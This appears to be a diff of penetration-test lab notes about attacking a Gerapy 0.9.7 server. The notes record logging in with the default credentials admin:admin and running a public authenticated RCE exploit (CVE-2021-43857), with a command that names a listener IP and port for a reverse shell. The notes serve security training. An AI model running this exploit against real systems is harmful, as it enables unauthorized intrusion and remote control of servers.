@@ -46,15 +46,16 @@ http://192.168.134.24:8000 [200 OK] Allow[GET
 - Found Gerapy 
 - able to loginusing default creds admin:admin 
 
-- Found Exploit
+- Found Exploits
 Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated) | python/remote/50640.py
+https://github.com/LongWayHomie/CVE-2021-43857
 
 ```
 ## INITIAL FOOTHOLD
 ```bash
 - Create a project post login or else the exploit will fail 
 
-sudo python3 50640.py -t 192.168.134.24 -p 8000 -L 192.168.45.152 -P 4444
+sudo python3 cve-2021-43857.py -t 192.168.134.24 -p 8000 -L 192.168.45.152 -P 4444
   ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
  / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
 | |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
